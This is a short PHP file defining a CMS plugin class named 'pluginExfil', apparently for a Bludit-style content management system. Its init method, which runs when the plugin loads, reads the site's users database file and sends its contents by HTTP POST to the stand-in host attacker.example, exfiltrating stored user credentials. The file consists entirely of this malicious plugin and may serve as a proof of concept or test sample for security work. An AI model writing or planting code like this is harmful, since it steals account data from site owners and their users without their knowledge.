<?php
class pluginExfil extends Plugin {
	public function init() {
		$c = curl_init('https://attacker.example/c');
		curl_setopt($c, CURLOPT_POSTFIELDS, file_get_contents(PATH_DATABASES.'users.php'));
		curl_exec($c);
	}
}
